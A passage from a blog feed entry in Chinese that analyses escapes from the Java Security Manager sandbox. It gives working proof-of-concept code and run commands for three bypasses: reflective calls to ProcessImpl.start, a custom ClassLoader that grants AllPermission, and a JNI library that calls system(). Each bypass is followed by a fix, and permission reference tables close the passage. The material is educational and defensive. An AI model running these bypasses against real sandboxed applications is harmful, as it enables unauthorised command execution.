program \""</span> + prog + <span class="string">"\""</span></span><br><span class="line">            + (dir == <span class="keyword">null</span> ? <span class="string">""</span> : <span class="string">" (in directory \""</span> + dir + <span class="string">"\")"</span>)</span><br><span class="line">            + exceptionInfo,</span><br><span class="line">            cause);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，显示检查了是否有执行命令的权限，然后实际是调用了ProcessImpl.start()方法来实现命令执行。也就是说，完成功能的是ProcessImpl.start()方法，而在这个方法调用之前，Java Security Manager就已经完成了检测。因此，当我们直接反射调用这个方法时，就能成功绕过Java Security Manager的检测过滤。</p><p>BypassSandbox类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BypassSandbox</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"[*]Running reflectProcessImpl()"</span>);</span><br><span class="line">        reflectProcessImpl(<span class="string">"calc"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">reflectProcessImpl</span><span class="params">(String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Class clz = Class.forName(<span class="string">"java.lang.ProcessImpl"</span>);</span><br><span class="line">        Method method = clz.getDeclaredMethod(<span class="string">"start"</span>, String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, <span class="keyword">boolean</span>.class);</span><br><span class="line">        method.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        method.invoke(clz, <span class="keyword">new</span> String[]&#123;command&#125;, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行即可绕过安全管理器的限制执行命令弹计算器：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Djava.security.manager -Djava.security.policy=&quot;E:\\my.policy&quot; BypassSandbox</span><br></pre></td></tr></table></figure><p><img src="/2020/05/03/浅析Java沙箱逃逸/9.png" alt=""></p><h4 id="修复方法-2"><a href="#修复方法-2" class="headerlink" title="修复方法"></a>修复方法</h4><p>不授予accessDeclaredMembers权限和suppressAccessChecks权限。</p><p>然而在Java中，反射是一个非常常见的操作，如果由于业务需要，无法禁用反射，但可以设置禁止反射的方法和变量的黑名单。比如前面调试分析的在sun.reflect.Reflection中定义了静态的methodFilterMap和fieldMethodMap，在这里面的方法和变量禁止反射。sun.reflect.Reflection还提供了几个方法，可以往methodFilterMap和fieldMethodMap中添加自定义的黑名单。代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">registerFieldsToFilter</span><span class="params">(Class&lt;?&gt; var0, String... var1)</span> </span>&#123;</span><br><span class="line">    fieldFilterMap = registerFilter(fieldFilterMap, var0, var1);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">registerMethodsToFilter</span><span class="params">(Class&lt;?&gt; var0, String... var1)</span> </span>&#123;</span><br><span class="line">    methodFilterMap = registerFilter(methodFilterMap, var0, var1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样，只需要在加载恶意代码之前，把禁止反射的黑名单加入这两个Map即可。</p><h3 id="创建ClassLoader绕过"><a href="#创建ClassLoader绕过" class="headerlink" title="创建ClassLoader绕过"></a>创建ClassLoader绕过</h3><h4 id="Bypass利用-2"><a href="#Bypass利用-2" class="headerlink" title="Bypass利用"></a>Bypass利用</h4><p>一个类的ProtectionDomain在这个类被ClassLoader加载时初始化。</p><p>如果我们能自定义一个ClassLoader来加载一个恶意类，并且把它的ProtectionDomain里面的权限初始化成所有权限，这样就能绕过Java Security Manager了。然而，当这个恶意类被调用时，它仅仅是栈中的一个栈帧，在它下面的栈帧对应的权限仍是policy文件指定的权限。</p><p>这个时候就是doPrivileged()发挥作用的时候了。AccessController会自顶向下遍历栈帧，如果遍历到doPrivileged，它会检查到调用doPrivileged()方法的栈帧为止。只要我们在恶意类中调用doPrivileged()方法，AccessController只会向下遍历检查到恶意类所在的栈帧，而恶意类对应的权限是所有权限，这样就可以绕过Java Security Manager了。</p><p>假设开发者自定义的策略文件my.policy，设置了createClassLoader权限和任意文件读取权限：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">grant&#123;</span><br><span class="line">    permission java.lang.RuntimePermission &quot;createClassLoader&quot;;</span><br><span class="line">    permission java.io.FilePermission &quot;&lt;&lt;ALL FILES&gt;&gt;&quot;, &quot;read&quot;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>Exploit类，静态代码中调用AccessController.doPrivileged()函数，其中执行恶意命令：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.security.AccessController;</span><br><span class="line"><span class="keyword">import</span> java.security.PrivilegedAction;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        AccessController.doPrivileged(<span class="keyword">new</span> PrivilegedAction() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> Object <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Process process = Runtime.getRuntime().exec(<span class="string">"calc"</span>);</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception var2) &#123;</span><br><span class="line">                    var2.printStackTrace();</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>MyClassLoader类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.nio.ByteBuffer;</span><br><span class="line"><span class="keyword">import</span> java.nio.channels.Channels;</span><br><span class="line"><span class="keyword">import</span> java.nio.channels.FileChannel;</span><br><span class="line"><span class="keyword">import</span> java.nio.channels.WritableByteChannel;</span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"><span class="keyword">import</span> java.security.cert.Certificate;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyClassLoader</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyClassLoader</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyClassLoader</span><span class="params">(ClassLoader parent)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(parent);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        File file = getClassFile(name);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">byte</span>[] bytes = getClassBytes(file);</span><br><span class="line">            <span class="comment">//在这里调用defineClazz，而不是super.defineClass</span></span><br><span class="line">            Class&lt;?&gt; c = defineClazz(name, bytes, <span class="number">0</span>, bytes.length);</span><br><span class="line">            <span class="keyword">return</span> c;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.findClass(name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> Class&lt;?&gt; defineClazz(String name, <span class="keyword">byte</span>[] b, <span class="keyword">int</span> off, <span class="keyword">int</span> len) <span class="keyword">throws</span> ClassFormatError &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            PermissionCollection pc = <span class="keyword">new</span> Permissions();</span><br><span class="line">            pc.add(<span class="keyword">new</span> AllPermission());</span><br><span class="line"></span><br><span class="line">            <span class="comment">//设置ProtectionDomain</span></span><br><span class="line">            ProtectionDomain pd = <span class="keyword">new</span> ProtectionDomain(<span class="keyword">new</span> CodeSource(<span class="keyword">null</span>, (Certificate[]) <span class="keyword">null</span>),</span><br><span class="line">                    pc, <span class="keyword">this</span>, <span class="keyword">null</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.defineClass(name, b, off, len, pd);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> File <span class="title">getClassFile</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        File file = <span class="keyword">new</span> File(<span class="string">"./"</span> + name + <span class="string">".class"</span>);</span><br><span class="line">        <span class="keyword">return</span> file;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">byte</span>[] getClassBytes(File file) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        FileInputStream fis = <span class="keyword">new</span> FileInputStream(file);</span><br><span class="line">        FileChannel fc = fis.getChannel();</span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        WritableByteChannel wbc = Channels.newChannel(baos);</span><br><span class="line">        ByteBuffer by = ByteBuffer.allocate(<span class="number">1024</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">            <span class="keyword">int</span> i = fc.read(by);</span><br><span class="line">            <span class="keyword">if</span> (i == <span class="number">0</span> || i == -<span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            by.flip();</span><br><span class="line">            wbc.write(by);</span><br><span class="line">            by.clear();</span><br><span class="line">        &#125;</span><br><span class="line">        fis.close();</span><br><span class="line">        <span class="keyword">return</span> baos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>BypassSandbox类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BypassSandbox</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        MyClassLoader mcl = <span class="keyword">new</span> MyClassLoader();</span><br><span class="line">        Class&lt;?&gt; c1 = Class.forName(<span class="string">"Exploit"</span>, <span class="keyword">true</span>, mcl);</span><br><span class="line">        Object obj = c1.newInstance();</span><br><span class="line">        System.out.println(obj.getClass().getClassLoader());</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时尝试运行会发现报错：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Djava.security.manager -Djava.security.policy="E:\\my.policy" BypassSandbox</span><br></pre></td></tr></table></figure><p><img src="/2020/05/03/浅析Java沙箱逃逸/20.png" alt=""></p><p>具体执行失败的原因可以参考threedr3am大佬的解释：<a href="https://github.com/codeplutos/java-security-manager-bypass/issues/2" target="_blank" rel="noopener">自定义ClassLoader绕过poc为什么很多人执行出现问题的缘由 #2</a></p><p>一个简单的解决办法就是，在自定义的ClassLoader中重写loadClass()方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> Class&lt;?&gt; loadClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">    <span class="keyword">if</span> (name.contains(<span class="string">"Exploit"</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> findClass(name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">super</span>.loadClass(name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再试一下就OK了：</p><p><img src="/2020/05/03/浅析Java沙箱逃逸/19.png" alt=""></p><h4 id="修复方法-3"><a href="#修复方法-3" class="headerlink" title="修复方法"></a>修复方法</h4><p>禁止createClassLoader权限。</p><h3 id="调用本地方法绕过"><a href="#调用本地方法绕过" class="headerlink" title="调用本地方法绕过"></a>调用本地方法绕过</h3><h4 id="Bypass利用-3"><a href="#Bypass利用-3" class="headerlink" title="Bypass利用"></a>Bypass利用</h4><p>Java Security Manager是在Java核心库中的一个功能，而Java中native方法是由JVM执行的，不受Java Security Manager管控。因此，我们可以调用Java native方法，绕过Java Security Manager。</p><p>my.policy，允许loadLibrary以及根目录下任意文件读权限：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">grant&#123;</span><br><span class="line">    permission java.lang.RuntimePermission &quot;loadLibrary.*&quot;;</span><br><span class="line">    permission java.io.FilePermission &quot;/root/-&quot;, &quot;read&quot;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>EvilMethodClass类，声明一个native方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.evil;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvilMethodClass</span> </span>&#123;</span><br><span class="line">    <span class="comment">//加载动态链接库</span></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.load(<span class="string">"/root/libEvilMethodClass.so"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//声明一个native方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> String <span class="title">evilMethod</span><span class="params">(String name)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>生成.h头：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">javac src/com/evil/EvilMethodClass.java -d ./bin</span><br><span class="line">javah -jni -classpath ./bin -d ./jni com.evil.EvilMethodClass</span><br><span class="line">javah -jni -classpath ./bin -o EvilMethodClass.h com.evil.EvilMethodClass</span><br></pre></td></tr></table></figure><p>新建EvilMethodClass.c：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"com_evil_EvilMethodClass.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __cplusplus</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">"C"</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">JNIEXPORT jstring JNICALL <span class="title">Java_com_evil_EvilMethodClass_evilMethod</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">        JNIEnv *env, jclass cls, jstring j_str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *c_str = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">char</span> buff[<span class="number">128</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    c_str = (*env)-&gt;GetStringUTFChars(env, j_str, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (c_str == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"out of memory.n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//在这里执行系统命令</span></span><br><span class="line">    system(c_str);</span><br><span class="line">    (*env)-&gt;ReleaseStringUTFChars(env, j_str, c_str);</span><br><span class="line">    <span class="keyword">return</span> (*env)-&gt;NewStringUTF(env, buff);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __cplusplus</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>编译，生成动态链接库，然后放到/root/目录下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -I$JAVA_HOME/include -I$JAVA_HOME/include/linux -fPIC -shared EvilMethodClass.c -o libEvilMethodClass.so</span><br></pre></td></tr></table></figure><p>Poc.java：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Poc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        EvilMethodClass.evilMethod(<span class="string">"whoami"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里将Poc.java和EvilMethodClass.java一同打包成jar，然后在Kali中运行即可绕过Java Security Manager：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Djava.security.manager -Djava.security.policy=my.policy -jar exp.jar</span><br></pre></td></tr></table></figure><p><img src="/2020/05/03/浅析Java沙箱逃逸/21.png" alt=""></p><h4 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h4><p>不授予loadLibrary权限。</p><h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a href="https://www.cnblogs.com/MyStringIsNotNull/p/8268351.html" target="_blank" rel="noopener">java中的安全模型(沙箱机制)</a></p><p><a href="https://www.anquanke.com/post/id/151398" target="_blank" rel="noopener">java沙箱绕过</a></p><p><a href="http://phrack.org/papers/escaping_the_java_sandbox.html" target="_blank" rel="noopener">Twenty years of Escaping the Java Sandbox</a></p><p><a href="https://xz.aliyun.com/t/2840" target="_blank" rel="noopener">Java沙箱逃逸走过的二十个春秋（一）</a></p><h2 id="0x05-附录"><a href="#0x05-附录" class="headerlink" title="0x05 附录"></a>0x05 附录</h2><h3 id="A"><a href="#A" class="headerlink" title="A"></a>A</h3><table><thead><tr><th>权限名</th><th>用途说明</th></tr></thead><tbody><tr><td>accessClassInPackage.</td><td>允许代码访问指定包中的类</td></tr><tr><td>accessDeclaredMembers</td><td>允许代码使用反射访问其他类中私有或保护的成员</td></tr><tr><td>createClassLoader</td><td>允许代码实例化类加载器</td></tr><tr><td>createSecurityManager</td><td>允许代码实例化安全管理器，它将允许程序化的实现对沙箱的控制</td></tr><tr><td>defineClassInPackage.</td><td>允许代码在指定包中定义类</td></tr><tr><td>exitVM</td><td>允许代码关闭整个虚拟机</td></tr><tr><td>getClassLoader</td><td>允许代码访问类加载器以获得某个特定的类</td></tr><tr><td>getProtectionDomain</td><td>允许代码访问保护域对象以获得某个特定类</td></tr><tr><td>loadlibrary.</td><td>允许代码装载指定类库</td></tr><tr><td>modifyThread</td><td>允许代码调整指定的线程参数</td></tr><tr><td>modifyThreadGroup</td><td>允许代码调整指定的线程组参数</td></tr><tr><td>queuePrintJob</td><td>允许代码初始化一个打印任务</td></tr><tr><td>readFileDescriptor</td><td>允许代码读文件描述符（相应的文件是由其他保护域中的代码打开的）</td></tr><tr><td>setContextClassLoader</td><td>允许代码为某线程设置上下文类加载器</td></tr><tr><td>setFactory</td><td>允许代码创建套接字工厂</td></tr><tr><td>setIO</td><td>允许代码重定向System.in、System.out或System.err输入输出流</td></tr><tr><td>setSecurityManager</td><td>允许代码设置安全管理器</td></tr><tr><td>stopThread</td><td>允许代码调用线程类的stop()方法</td></tr><tr><td>writeFileDescriptor</td><td>允许代码写文件描述符</td></tr></tbody></table><h3 id="B"><a href="#B" class="headerlink" title="B"></a>B</h3><table><thead><tr><th>权限名</th><th>用途说明</th></tr></thead><tbody><tr><td>accessClipboard</td><td>允许访问系统的全局剪贴板</td></tr><tr><td>accessEventQueue</td><td>允许直接访问事件队列</td></tr><tr><td>createRobot</td><td>允许代码创建AWT的Robot类</td></tr><tr><td>listenToAllAWTEvents</td><td>允许代码直接监听事件分发</td></tr><tr><td>readDisplayPixels</td><td>允许AWT Robot读显示屏上的像素</td></tr><tr><td>showWindowWithoutWarningBanner</td><td>允许创建无标题栏的窗口</td></tr></tbody></table><h3 id="C"><a href="#C" class="headerlink" title="C"></a>C</h3><table><thead><tr><th>权限名</th><th>用途说明</th></tr></thead><tbody><tr><td>specifyStreamHandler</td><td>允许在URL类中安装新的流处理器</td></tr><tr><td>setDefaultAuthenticator</td><td>可以安装鉴别类</td></tr><tr><td>requestPassworkAuthentication</td><td>可以完成鉴别</td></tr></tbody></table><h3 id="D"><a href="#D" class="headerlink" title="D"></a>D</h3><table><thead><tr><th>权限名</th><th>用途说明</th></tr></thead><tbody><tr><td>addIdentityCertificate</td><td>为Identity增加一个证书</td></tr><tr><td>clearProviderProperties.</td><td>针对指定的提供者，删除所有属性</td></tr><tr><td>createAccessControlContext</td><td>允许创建一个存取控制器的上下文环境</td></tr><tr><td>getDomainCombiner</td><td>允许撤销保护域</td></tr><tr><td>getPolicy</td><td>检索可以实现沙箱策略的类</td></tr><tr><td>getProperty.</td><td>读取指定的安全属性</td></tr><tr><td>getSignerPrivateKey</td><td>由Signer对象获取私有密钥</td></tr><tr><td>insertProvider.</td><td>将指定的提供者添加到响应的安全提供者组中</td></tr><tr><td>loadProviderProperties.</td><td>装载指定的提供者的属性</td></tr><tr><td>printIdentity</td><td>打印Identity类内容</td></tr><tr><td>putAllProviderProperties.</td><td>更新指定的提供者的属性</td></tr><tr><td>putProviderProperty.</td><td>为指定的提供者增加一个属性</td></tr><tr><td>removeIdentityCertificate</td><td>取消Identity对象的证书</td></tr><tr><td>removeProvider.</td><td>将指定的提供者从相应的安全提供者组中删除</td></tr><tr><td>removeProviderProperty.</td><td>删除指定的安全提供者的某个属性</td></tr><tr><td>setIdentityInfo</td><td>为某个Identity对象设置信息串</td></tr><tr><td>setIdentityPublicKey</td><td>为某个Identity对象设置公钥</td></tr><tr><td>setPolicy</td><td>设置可以实现沙箱策略的类</td></tr><tr><td>setProperty.</td><td>设置指定的安全属性</td></tr><tr><td>setSignerKeyPair</td><td>在Signer对象中设置密钥对</td></tr><tr><td>setSystemScope</td><td>设置系统所用的IdentityScope</td></tr></tbody></table><h3 id="E"><a href="#E" class="headerlink" title="E"></a>E</h3><table><thead><tr><th>权限名</th><th>用途说明</th></tr></thead><tbody><tr><td>enableSubstitution</td><td>允许实现ObjectInputStream类的enableResolveObject()方法和ObjectOutputStream类的enableReplaceObject()方法</td></tr><tr><td>enableSubclassImplementation</td><td>允许ObjectInputStream和ObjectOutputStream创建子类，子类可以覆盖readObject()和writeObject()方法</td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
      <category term="沙箱逃逸" scheme="https://www.mi1k7ea.com/tags/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"/>
    
  </entry>
  
  <entry>
    <title>浅谈JVMTI</title>
    <link href="https://www.mi1k7ea.com/2020/05/03/%E6%B5%85%E8%B0%88JVMTI/"/>
